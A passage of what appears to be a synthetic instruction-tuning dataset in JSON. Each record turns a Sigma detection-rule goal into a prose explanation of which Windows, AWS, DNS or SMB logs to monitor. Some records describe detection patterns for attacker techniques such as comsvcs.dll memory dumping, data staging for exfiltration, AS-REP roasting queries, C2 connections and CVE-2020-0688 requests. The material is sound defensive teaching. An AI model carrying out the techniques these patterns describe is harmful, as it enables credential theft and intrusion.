    "output": "In order to detect obfuscated use of environment variables to execute PowerShell, you should monitor Windows PowerShell modules for specific patterns of command execution that attempt to disguise their activities. This involves looking for commands that use the `cmd` utility with either `/c` or `/r` options followed by a set of characters indicating an attempt to set an environment variable. The pattern to watch involves a complex structure where the `set` command is used with a variable name ranging from three to six characters in length, immediately followed by a secretive usage of curly braces and numbers (indicating an attempt at obfuscation by accessing environment variables in an unusual way) and then proceeding with a `-f` option possibly indicating formatting or further command instructions contained within parentheses.\n\nThis detection relies on observing command-line parameters that fit the above description within the PowerShell module logs (`ps_module` category) on Windows systems. Such activities can be indicative of attempts to evade detection by using environment variables in non-standard ways to execute malicious PowerShell scripts or commands.\n\nIn terms of cybersecurity, these activities are associated with tactics and techniques that include but are not limited to Execution, Defense Evasion, and possibly Discovery if the attackers are probing the environment variables for information. While it's recognized that there may be unknown legitimate use cases that could potentially trigger this detection pattern, the level of threat is considered high due to the sophisticated nature of the obfuscation techniques used. Therefore, any hits on this pattern demands thorough investigation to rule out or confirm malicious intent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated use of Environment Variables to execute PowerShell",
      "answer": "In order to detect obfuscated use of environment variables to execute PowerShell, you should monitor Windows PowerShell modules for specific patterns of command execution that attempt to disguise their activities. This involves looking for commands that use the `cmd` utility with either `/c` or `/r` options followed by a set of characters indicating an attempt to set an environment variable. The pattern to watch involves a complex structure where the `set` command is used with a variable name ranging from three to six characters in length, immediately followed by a secretive usage of curly braces and numbers (indicating an attempt at obfuscation by accessing environment variables in an unusual way) and then proceeding with a `-f` option possibly indicating formatting or further command instructions contained within parentheses.\n\nThis detection relies on observing command-line parameters that fit the above description within the PowerShell module logs (`ps_module` category) on Windows systems. Such activities can be indicative of attempts to evade detection by using environment variables in non-standard ways to execute malicious PowerShell scripts or commands.\n\nIn terms of cybersecurity, these activities are associated with tactics and techniques that include but are not limited to Execution, Defense Evasion, and possibly Discovery if the attackers are probing the environment variables for information. While it's recognized that there may be unknown legitimate use cases that could potentially trigger this detection pattern, the level of threat is considered high due to the sophisticated nature of the obfuscation techniques used. Therefore, any hits on this pattern demands thorough investigation to rule out or confirm malicious intent."
    }
  },
  {
    "instruction": "Please help me detect the following: activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers",
    "context": "",
    "output": "Sure!\nIn order to detect activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers, you should monitor Windows process creation logs for specific behaviors indicative of this malicious group's tactics. Look out for processes that involve:\n\n1. The use of the `attrib` command to modify file attributes secretly, specifically adding hidden, system, and read-only attributes to `.aspx` files. This may indicate an attempt to discreetly deploy malicious web shells or scripts.\n\n2. Activities involving the `\\ProgramData\\VSPerfMon\\` directory, particularly when the `schtasks` command is used in conjunction with `VSPerfMon`. This is indicative of attempts to schedule malicious tasks or manipulate performance monitoring tools for nefarious purposes.\n\n3. The execution of the Opera browser (`Opera_browser.exe`) launched from suspicious parent processes like `services.exe` or `svchost.exe`, or from an unusual location such as `Users\\Public\\opera`. This could signal an attempt to bypass security measures by leveraging legitimate software.\n\n4. The use of `vssadmin list shadows` command directing output to a temporary directory named `__output`. This could indicate attempts to interact with or manipulate volume shadow copies, possibly for data exfiltration or to avoid data loss prevention measures.\n\n5. Invocation of `makecab.exe` to compress files located in `inetpub\\wwwroot\\` or the `Microsoft\\Exchange Server\\` directory. This might denote attempts to package stolen data for exfiltration.\n\n6. Usage of `7zip` to compress data in `C:\\Programdata\\pst` into an archive named `it.zip`. This action could suggest an effort to compress and exfiltrate sensitive data stealthily.\n\n7. Commands involving `rundll32.exe` executing `comsvcs.dll` to create minidumps. This might be utilized for dumping process memory, potentially targeting sensitive information or facilitating further attacks.\n\n8. Any command-line activity involving rare or suspicious batch files (`xx.bat`), executables (`cw.exe`), or unrecognized service components (`WwanSvcdcs`).\n\nMonitoring for these specific behaviors across Windows processes is critical, given their association with HAFNIUM group activities targeting Exchange servers. These indicators are generally unlikely to trigger false positives, emphasizing the need for immediate investigation and response when detected, considering the critical severity of these activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers",
      "answer": "In order to detect activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers, you should monitor Windows process creation logs for specific behaviors indicative of this malicious group's tactics. Look out for processes that involve:\n\n1. The use of the `attrib` command to modify file attributes secretly, specifically adding hidden, system, and read-only attributes to `.aspx` files. This may indicate an attempt to discreetly deploy malicious web shells or scripts.\n\n2. Activities involving the `\\ProgramData\\VSPerfMon\\` directory, particularly when the `schtasks` command is used in conjunction with `VSPerfMon`. This is indicative of attempts to schedule malicious tasks or manipulate performance monitoring tools for nefarious purposes.\n\n3. The execution of the Opera browser (`Opera_browser.exe`) launched from suspicious parent processes like `services.exe` or `svchost.exe`, or from an unusual location such as `Users\\Public\\opera`. This could signal an attempt to bypass security measures by leveraging legitimate software.\n\n4. The use of `vssadmin list shadows` command directing output to a temporary directory named `__output`. This could indicate attempts to interact with or manipulate volume shadow copies, possibly for data exfiltration or to avoid data loss prevention measures.\n\n5. Invocation of `makecab.exe` to compress files located in `inetpub\\wwwroot\\` or the `Microsoft\\Exchange Server\\` directory. This might denote attempts to package stolen data for exfiltration.\n\n6. Usage of `7zip` to compress data in `C:\\Programdata\\pst` into an archive named `it.zip`. This action could suggest an effort to compress and exfiltrate sensitive data stealthily.\n\n7. Commands involving `rundll32.exe` executing `comsvcs.dll` to create minidumps. This might be utilized for dumping process memory, potentially targeting sensitive information or facilitating further attacks.\n\n8. Any command-line activity involving rare or suspicious batch files (`xx.bat`), executables (`cw.exe`), or unrecognized service components (`WwanSvcdcs`).\n\nMonitoring for these specific behaviors across Windows processes is critical, given their association with HAFNIUM group activities targeting Exchange servers. These indicators are generally unlikely to trigger false positives, emphasizing the need for immediate investigation and response when detected, considering the critical severity of these activities."
    }
  },
  {
    "instruction": "Please help me detect the following: AWS Config Service disabling",
    "context": "",
    "output": "Sure!\nIn order to detect AWS Config Service disabling, you should monitor CloudTrail logs for specific activities that indicate a potential disruption of the AWS Config service. Specifically, look out for logs where the event source is `config.amazonaws.com` and the event name is either `DeleteDeliveryChannel` or `StopConfigurationRecorder`. These events suggest that someone might be trying to delete the delivery channel or stop the configuration recorder within AWS Config, which are critical components for the monitoring and governance of AWS resources. The configurations being changed or stopped could signify a deliberate attempt to evade detection or weaken security policies. It is essential to treat these actions with a high level of suspicion, although it's also important to recognize that there may be legitimate reasons for such changes, such as a valid modification in the AWS Config service setup by the administrators. As such, while this activity is being flagged as of 'high' level concern due to its potential implications on security posture, it is also recommended to verify the context of these actions to discern between malicious activity and legitimate administrative tasks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "AWS Config Service disabling",
      "answer": "In order to detect AWS Config Service disabling, you should monitor CloudTrail logs for specific activities that indicate a potential disruption of the AWS Config service. Specifically, look out for logs where the event source is `config.amazonaws.com` and the event name is either `DeleteDeliveryChannel` or `StopConfigurationRecorder`. These events suggest that someone might be trying to delete the delivery channel or stop the configuration recorder within AWS Config, which are critical components for the monitoring and governance of AWS resources. The configurations being changed or stopped could signify a deliberate attempt to evade detection or weaken security policies. It is essential to treat these actions with a high level of suspicion, although it's also important to recognize that there may be legitimate reasons for such changes, such as a valid modification in the AWS Config service setup by the administrators. As such, while this activity is being flagged as of 'high' level concern due to its potential implications on security posture, it is also recommended to verify the context of these actions to discern between malicious activity and legitimate administrative tasks."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques",
    "context": "",
    "output": "In order to detect potential preparation for data exfiltration using tunneling techniques, particularly through the installation of well-known TAP software, you should focus on monitoring Windows security event logs. Specifically, it is crucial to ensure that the 'System Security Extension' audit subcategory is enabled, which allows for the logging of Event ID (EID) 4697. This event ID is significant as it is recorded when a service is installed on the system. An important indicator of suspicious activity is when the service file name associated with the event contains 'tap0901', which is commonly linked to OpenVPN TAP installations.\n\nIt's essential to pay attention to this activity because, while OpenVPN's TAP driver installation is a legitimate action in many contexts, it can be misused in this scenario for setting up a tunneling mechanism that attackers could leverage for data exfiltration. Consequently, any detection of an EID 4697 event with 'tap0901' in the service file name should be carefully investigated. However, it's also important to consider the possibility of false positives, particularly in environments where the OpenVPN TAP installation is expected and legitimate.\n\nThis monitoring strategy aligns with the tactics and techniques associated with Command and Control and Exfiltration, which involve the establishment of communication channels and the movement of data out of a target network in a manner that evades detection. This approach not only helps in identifying potential threats but also aids in understanding the context of their operations, allowing for more effective responses to prevent data breaches.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques",
      "answer": "In order to detect potential preparation for data exfiltration using tunneling techniques, particularly through the installation of well-known TAP software, you should focus on monitoring Windows security event logs. Specifically, it is crucial to ensure that the 'System Security Extension' audit subcategory is enabled, which allows for the logging of Event ID (EID) 4697. This event ID is significant as it is recorded when a service is installed on the system. An important indicator of suspicious activity is when the service file name associated with the event contains 'tap0901', which is commonly linked to OpenVPN TAP installations.\n\nIt's essential to pay attention to this activity because, while OpenVPN's TAP driver installation is a legitimate action in many contexts, it can be misused in this scenario for setting up a tunneling mechanism that attackers could leverage for data exfiltration. Consequently, any detection of an EID 4697 event with 'tap0901' in the service file name should be carefully investigated. However, it's also important to consider the possibility of false positives, particularly in environments where the OpenVPN TAP installation is expected and legitimate.\n\nThis monitoring strategy aligns with the tactics and techniques associated with Command and Control and Exfiltration, which involve the establishment of communication channels and the movement of data out of a target network in a manner that evades detection. This approach not only helps in identifying potential threats but also aids in understanding the context of their operations, allowing for more effective responses to prevent data breaches."
    }
  },
  {
    "instruction": "Can you explain how to detect: Detect use of icacls to deny access for everyone in Users folder sometimes used to hide malicious files",
    "context": "",
    "output": "Certainly!\n\nIn order to detect use of icacls to deny access for everyone in Users folder, sometimes used to hide malicious files, you should monitor for the creation of processes related to the execution of the 'icacls.exe' command, specifically under the Windows operating system. Look for instances where the original file name is marked as 'iCACLS.EXE' or the image path ends with '\\icacls.exe'. Additionally, pay close attention to the command line parameters, particularly commands that include paths starting with 'C:\\Users\\', coupled with the '/deny' parameter and the security identifier '*S-1-1-0:', which corresponds to denying access to the \"Everyone\" group. This combination of path, option, and identifier is a strong indicator that icacls is being used with potentially malicious intent, specifically to modify permissions in the User's folder to conceal unauthorized files. It's worth noting that there may be legitimate uses for these commands, so it is essential to consider the context in which they are being executed to reduce the number of false positives. The detection is based on process creation logs, making it critical to have a comprehensive logging mechanism on Windows machines to effectively monitor and react to such activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect use of icacls to deny access for everyone in Users folder sometimes used to hide malicious files",
      "answer": "In order to detect use of icacls to deny access for everyone in Users folder, sometimes used to hide malicious files, you should monitor for the creation of processes related to the execution of the 'icacls.exe' command, specifically under the Windows operating system. Look for instances where the original file name is marked as 'iCACLS.EXE' or the image path ends with '\\icacls.exe'. Additionally, pay close attention to the command line parameters, particularly commands that include paths starting with 'C:\\Users\\', coupled with the '/deny' parameter and the security identifier '*S-1-1-0:', which corresponds to denying access to the \"Everyone\" group. This combination of path, option, and identifier is a strong indicator that icacls is being used with potentially malicious intent, specifically to modify permissions in the User's folder to conceal unauthorized files. It's worth noting that there may be legitimate uses for these commands, so it is essential to consider the context in which they are being executed to reduce the number of false positives. The detection is based on process creation logs, making it critical to have a comprehensive logging mechanism on Windows machines to effectively monitor and react to such activities."
    }
  },
  {
    "instruction": "Can you explain how to detect: suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452",
    "context": "",
    "output": "Certainly!\n\nIn order to detect suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452, you should: Monitor for the creation of any process on Windows systems where the command line includes 'rundll32.exe' along with the strings 'Execute', 'RegRead', and 'window.close' all together. This specific combination of command-line arguments is indicative of a potential malicious activity where rundll32.exe is misused to execute inline Visual Basic scripts, a method that has been observed in strategies deployed by the threat group UNC2452. The detection of such activity is considered of high importance due to the unique and suspicious nature of these command-line arguments when used in conjunction. Be aware that while this detection rule is crucial for identifying potential threats, there might be occurrences where legitimate processes could use similar command structures, although such cases are not commonly known.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452",
      "answer": "In order to detect suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452, you should: Monitor for the creation of any process on Windows systems where the command line includes 'rundll32.exe' along with the strings 'Execute', 'RegRead', and 'window.close' all together. This specific combination of command-line arguments is indicative of a potential malicious activity where rundll32.exe is misused to execute inline Visual Basic scripts, a method that has been observed in strategies deployed by the threat group UNC2452. The detection of such activity is considered of high importance due to the unique and suspicious nature of these command-line arguments when used in conjunction. Be aware that while this detection rule is crucial for identifying potential threats, there might be occurrences where legitimate processes could use similar command structures, although such cases are not commonly known."
    }
  },
  {
    "instruction": "How to detect: possible remote connections to Silenttrinity c2",
    "context": "",
    "output": "In order to detect a possible remote connections to Silenttrinity c2, you should: Focus on analyzing network connection logs specifically from Windows-based systems. Look for events where an application, identified by ending with the path '\\msbuild.exe', initiates a network connection. This particular application is significant as it is commonly leveraged in such remote connection attempts. However, not all network activities flagged via this application are of concern; therefore, refine your detection by excluding network connections that are made to the standard web ports 80 and 443. These exclusions are crucial as communications over these ports could be benign and are commonly used for legitimate web traffic, thus reducing the possibility of false positives. Despite potential unknown false positives, the identification of such network activities should be treated with a high level of scrutiny due to the associated risk of Silenttrinity c2 connections.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "possible remote connections to Silenttrinity c2",
      "answer": "In order to detect a possible remote connections to Silenttrinity c2, you should: Focus on analyzing network connection logs specifically from Windows-based systems. Look for events where an application, identified by ending with the path '\\msbuild.exe', initiates a network connection. This particular application is significant as it is commonly leveraged in such remote connection attempts. However, not all network activities flagged via this application are of concern; therefore, refine your detection by excluding network connections that are made to the standard web ports 80 and 443. These exclusions are crucial as communications over these ports could be benign and are commonly used for legitimate web traffic, thus reducing the possibility of false positives. Despite potential unknown false positives, the identification of such network activities should be treated with a high level of scrutiny due to the associated risk of Silenttrinity c2 connections."
    }
  },
  {
    "instruction": "Please help me detect the following: threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario.",
    "context": "",
    "output": "Sure!\nIn order to detect a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario, you should: Monitor Windows file events for instances where a file is created or modified in the system, specifically looking for actions involving the `System` image and a target filename ending with `\\wbem\\wbemcomn.dll`. This indicates a high likelihood of a WMI DLL Hijacking attempt, which is a critical security threat. It's necessary to keep an eye on this activity as the lack of known false positives suggests that occurrences could likely denote malicious intent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario.",
      "answer": "In order to detect a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario, you should: Monitor Windows file events for instances where a file is created or modified in the system, specifically looking for actions involving the `System` image and a target filename ending with `\\wbem\\wbemcomn.dll`. This indicates a high likelihood of a WMI DLL Hijacking attempt, which is a critical security threat. It's necessary to keep an eye on this activity as the lack of known false positives suggests that occurrences could likely denote malicious intent."
    }
  },
  {
    "instruction": "How to detect: DNS zone transfer failed.",
    "context": "",
    "output": "In order to detect when a DNS zone transfer failed, you should monitor Windows DNS Server logs for Event ID 6004, which indicates that the DNS server received a zone transfer request from a source for a non-existent or non-authoritative zone. This observation is significant as it may suggest an unauthorized attempt to replicate DNS data, potentially indicating reconnaissance by an adversary. The importance of paying attention to such events is emphasized by the low likelihood of false positives, making it a reliable indicator of suspicious activity. Monitoring for this specific event can help in identifying attempts to map the internal network structure which falls under the reconnaissance category in cybersecurity frameworks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "DNS zone transfer failed.",
      "answer": "In order to detect when a DNS zone transfer failed, you should monitor Windows DNS Server logs for Event ID 6004, which indicates that the DNS server received a zone transfer request from a source for a non-existent or non-authoritative zone. This observation is significant as it may suggest an unauthorized attempt to replicate DNS data, potentially indicating reconnaissance by an adversary. The importance of paying attention to such events is emphasized by the low likelihood of false positives, making it a reliable indicator of suspicious activity. Monitoring for this specific event can help in identifying attempts to map the internal network structure which falls under the reconnaissance category in cybersecurity frameworks."
    }
  },
  {
    "instruction": "How can I detect: ZxShell start by the called and well-known function name",
    "context": "",
    "output": "In order to detect a ZxShell start by the called and well-known function name, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\rundll32.exe'. Specifically, look for command lines that contain either 'zxFunction' or 'RemoteDiskXXXXX'. These particular patterns in the command line are indicative of ZxShell activity. It is critical to capture the command line and parent command line details during detection to aid in the investigation. This monitoring is highly specific and unlikely to produce false positives, classifying it as a critical level security measure.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "ZxShell start by the called and well-known function name",
      "answer": "In order to detect a ZxShell start by the called and well-known function name, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\rundll32.exe'. Specifically, look for command lines that contain either 'zxFunction' or 'RemoteDiskXXXXX'. These particular patterns in the command line are indicative of ZxShell activity. It is critical to capture the command line and parent command line details during detection to aid in the investigation. This monitoring is highly specific and unlikely to produce false positives, classifying it as a critical level security measure."
    }
  },
  {
    "instruction": "How can I detect: remote task creation via at.exe or API interacting with ATSVC namedpipe",
    "context": "",
    "output": "In order to detect remote task creation via at.exe or API interacting with ATSVC namedpipe, you should: Monitor SMB (Server Message Block) file activities for specific patterns that indicate misuse of the SMB service for remote task management. Specifically, pay attention to file activities within the SMB protocol that involve access to the \"IPC$\" share, which is a special share that Windows computers use for inter-process communication. Additionally, look for any interaction with a file or named pipe called \"atsvc\", as this is a common tactic used by attackers to remotely create tasks on a target machine, typically utilizing the \"at.exe\" command or directly interacting with the ATSVC named pipe through an API. As such activities could potentially represent malicious behavior, it's important to log and analyze these interactions. Note that this monitoring is configured with a medium alert level due to the potential for false positives, as the exact circumstances under which these patterns may be benign are currently unknown and therefore any detection should be investigated to confirm the nature of the activity. This detection process is crucial for defending against tactics and techniques that involve Execution through remote task creation, specifically tying back to MITRE ATT&CK framework's documentation on these types of attack methodologies.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "remote task creation via at.exe or API interacting with ATSVC namedpipe",
      "answer": "In order to detect remote task creation via at.exe or API interacting with ATSVC namedpipe, you should: Monitor SMB (Server Message Block) file activities for specific patterns that indicate misuse of the SMB service for remote task management. Specifically, pay attention to file activities within the SMB protocol that involve access to the \"IPC$\" share, which is a special share that Windows computers use for inter-process communication. Additionally, look for any interaction with a file or named pipe called \"atsvc\", as this is a common tactic used by attackers to remotely create tasks on a target machine, typically utilizing the \"at.exe\" command or directly interacting with the ATSVC named pipe through an API. As such activities could potentially represent malicious behavior, it's important to log and analyze these interactions. Note that this monitoring is configured with a medium alert level due to the potential for false positives, as the exact circumstances under which these patterns may be benign are currently unknown and therefore any detection should be investigated to confirm the nature of the activity. This detection process is crucial for defending against tactics and techniques that involve Execution through remote task creation, specifically tying back to MITRE ATT&CK framework's documentation on these types of attack methodologies."
    }
  },
  {
    "instruction": "How can I detect: execution of Microsoft Defender's CLI process (MpCmdRun.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL",
    "context": "",
    "output": "In order to detect execution of Microsoft Defender's CLI process (MpCmdRun.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL, you should: Monitor for the creation of processes specifically ending with '\\MpCmdRun.exe' on Windows systems, focusing on those originating from directories other than the standard legitimate paths which include 'C:\\Program Files\\Windows Defender\\', 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\', 'C:\\Windows\\winsxs\\', and 'C:\\Program Files\\Microsoft Security Client\\MpCmdRun.exe'. This detection targets scenarios where an attacker might attempt to execute malicious code by masquerading as the legitimate Microsoft Defender Command Line Utility, indicating a high level of suspicion for such activities not originating from the aforementioned legitimate directories.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of Microsoft Defender's CLI process (MpCmdRun.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL",
      "answer": "In order to detect execution of Microsoft Defender's CLI process (MpCmdRun.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL, you should: Monitor for the creation of processes specifically ending with '\\MpCmdRun.exe' on Windows systems, focusing on those originating from directories other than the standard legitimate paths which include 'C:\\Program Files\\Windows Defender\\', 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\', 'C:\\Windows\\winsxs\\', and 'C:\\Program Files\\Microsoft Security Client\\MpCmdRun.exe'. This detection targets scenarios where an attacker might attempt to execute malicious code by masquerading as the legitimate Microsoft Defender Command Line Utility, indicating a high level of suspicion for such activities not originating from the aforementioned legitimate directories."
    }
  },
  {
    "instruction": "How to detect: suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts",
    "context": "",
    "output": "In order to detect suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts, you should: Monitor Linux syslog entries for certain indicative error messages that suggest potential exploitative activity or critical issues. Specifically, focus on logs mentioning \"dropping source port zero packet from\", which could imply an attempt to exploit or probe DNS services in a way that deviates from standard, secure practices. Also, look out for messages containing \"denied AXFR from\", indicating an attempted unauthorized zone transfer, which could be an attacker trying to enumerate or steal DNS records\u2014a tactic often used in reconnaissance before launching an attack. Additionally, be vigilant for logs with \"exiting (due to fatal error)\", as this suggests a service crash that could be the consequence of an exploit attempt. Identifying these patterns is crucial in promptly detecting and mitigating threats that leverage DNS vulnerabilities or misconfigurations for malicious purposes. It's important to note that while these indicators are strong signs of suspicious activity, there might be false positives, and their origin should be investigated to confirm malicious intent. The severity of these detections is considered high due to the potential impact on DNS service availability and security.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts",
      "answer": "In order to detect suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts, you should: Monitor Linux syslog entries for certain indicative error messages that suggest potential exploitative activity or critical issues. Specifically, focus on logs mentioning \"dropping source port zero packet from\", which could imply an attempt to exploit or probe DNS services in a way that deviates from standard, secure practices. Also, look out for messages containing \"denied AXFR from\", indicating an attempted unauthorized zone transfer, which could be an attacker trying to enumerate or steal DNS records\u2014a tactic often used in reconnaissance before launching an attack. Additionally, be vigilant for logs with \"exiting (due to fatal error)\", as this suggests a service crash that could be the consequence of an exploit attempt. Identifying these patterns is crucial in promptly detecting and mitigating threats that leverage DNS vulnerabilities or misconfigurations for malicious purposes. It's important to note that while these indicators are strong signs of suspicious activity, there might be false positives, and their origin should be investigated to confirm malicious intent. The severity of these detections is considered high due to the potential impact on DNS service availability and security."
    }
  },
  {
    "instruction": "Please help me detect the following: AS-REP roasting is an attack that is often-overlooked. It is not very common as you have to explicitly set accounts that do not require pre-authentication.",
    "context": "",
    "output": "Sure!\nIn order to detect AS-REP roasting, an attack that is often-overlooked because it involves explicitly setting accounts to not require pre-authentication, you should: Monitor Windows PowerShell scripts for specific operations that may indicate an attempt to exploit this vulnerability. Specifically, ensure that Script Block Logging is enabled to capture detailed logging of PowerShell script executions. Look for scripts that include the combination of 'Get-ADUser', '-Filter', 'useraccountcontrol', '-band', and '4194304'. This pattern suggests an attempt to identify user accounts configured to not require Kerberos pre-authentication (indicated by the userAccountControl attribute flag 'DONT_REQ_PREAUTH' or the numerical value 4194304), a key indicator of AS-REP roasting attempts. Be aware that there may be legitimate scripts that perform similar queries, so evaluate detections in context to reduce false positives. The detection is considered to have a medium level of confidence due to the balance between identifying malicious activity and avoiding false positive detections from legitimate script use.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "AS-REP roasting is an attack that is often-overlooked. It is not very common as you have to explicitly set accounts that do not require pre-authentication.",
      "answer": "In order to detect AS-REP roasting, an attack that is often-overlooked because it involves explicitly setting accounts to not require pre-authentication, you should: Monitor Windows PowerShell scripts for specific operations that may indicate an attempt to exploit this vulnerability. Specifically, ensure that Script Block Logging is enabled to capture detailed logging of PowerShell script executions. Look for scripts that include the combination of 'Get-ADUser', '-Filter', 'useraccountcontrol', '-band', and '4194304'. This pattern suggests an attempt to identify user accounts configured to not require Kerberos pre-authentication (indicated by the userAccountControl attribute flag 'DONT_REQ_PREAUTH' or the numerical value 4194304), a key indicator of AS-REP roasting attempts. Be aware that there may be legitimate scripts that perform similar queries, so evaluate detections in context to reduce false positives. The detection is considered to have a medium level of confidence due to the balance between identifying malicious activity and avoiding false positive detections from legitimate script use."
    }
  },
  {
    "instruction": "How to detect: exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688",
    "context": "",
    "output": "In order to detect the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688, you should: Monitor webserver logs for specific patterns that indicate an attack attempt on Microsoft Exchange. Look for HTTP GET requests which contain either '/ecp/' or '/owa/' in the URI query, suggesting an attacker is trying to access the Exchange Control Panel or Outlook Web Access. Also, check for queries containing '__VIEWSTATE=' parameter, which might indicate an attempt to exploit the view state deserialization vulnerability. Capture the client's IP address and DNS name for each suspicious request. Note that there might be unknown benign activities that could trigger this detection, yet the severity of this particular exploitation attempt is considered critical.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688",
      "answer": "In order to detect the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688, you should: Monitor webserver logs for specific patterns that indicate an attack attempt on Microsoft Exchange. Look for HTTP GET requests which contain either '/ecp/' or '/owa/' in the URI query, suggesting an attacker is trying to access the Exchange Control Panel or Outlook Web Access. Also, check for queries containing '__VIEWSTATE=' parameter, which might indicate an attempt to exploit the view state deserialization vulnerability. Capture the client's IP address and DNS name for each suspicious request. Note that there might be unknown benign activities that could trigger this detection, yet the severity of this particular exploitation attempt is considered critical."
    }
  },
  {
    "instruction": "How can I detect: when an attacker tries to backdoor the MSSQL server by adding a backdoor account to the sysadmin fixed server role",
    "context": "",
    "output": "In order to detect when an attacker tries to backdoor the MSSQL server by adding a backdoor account to the sysadmin fixed server role, you should: Monitor Windows application logs specifically for events generated by MSSQLSERVER with the EventID 33205. This event ID is crucial as it indicates changes being made to the sysadmin fixed server role within the MSSQL server environment. You must look for modifications that include the addition of members to the sysadmin role, particularly focusing on the presence of phrases 'object_name:sysadmin' and 'statement:alter server role [sysadmin] add member' within the event data. This kind of activity is indicative of potential malicious behavior, where an attacker attempts to grant administrative privileges to a backdoor account, thereby gaining high-level access to the database system. \n\nTake into account that while this behavior might rarely coincide with legitimate administrative modifications, such events generally represent a high threat level and warrant immediate investigation. The detection of these specific event characteristics aids in identifying suspicious alterations to critical server roles, aligning with tactics and techniques that involve elevation of privilege and manipulation of database roles for unauthorized access or persistence within a targeted system.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when an attacker tries to backdoor the MSSQL server by adding a backdoor account to the sysadmin fixed server role",
      "answer": "In order to detect when an attacker tries to backdoor the MSSQL server by adding a backdoor account to the sysadmin fixed server role, you should: Monitor Windows application logs specifically for events generated by MSSQLSERVER with the EventID 33205. This event ID is crucial as it indicates changes being made to the sysadmin fixed server role within the MSSQL server environment. You must look for modifications that include the addition of members to the sysadmin role, particularly focusing on the presence of phrases 'object_name:sysadmin' and 'statement:alter server role [sysadmin] add member' within the event data. This kind of activity is indicative of potential malicious behavior, where an attacker attempts to grant administrative privileges to a backdoor account, thereby gaining high-level access to the database system. \n\nTake into account that while this behavior might rarely coincide with legitimate administrative modifications, such events generally represent a high threat level and warrant immediate investigation. The detection of these specific event characteristics aids in identifying suspicious alterations to critical server roles, aligning with tactics and techniques that involve elevation of privilege and manipulation of database roles for unauthorized access or persistence within a targeted system."
    }
  },
  {
    "instruction": "How can I detect: Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759",
    "context": "",
    "output": "In order to detect Winword starting uncommon sub-process csc.exe as used in exploits for CVE-2017-8759, you should monitor process creation logs on Windows systems. Specifically, look for events where Microsoft Word (WINWORD.EXE) is the parent process that initiates the Compiler for the .NET framework (csc.exe) as a child process. This behavior is unusual and could indicate an attempt to exploit CVE-2017-8759. Any detection of such activity should be considered critical, although it's acknowledged that there might be cases where such behavior does not represent a security threat, these instances are, however, unknown and potentially very rare.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759",
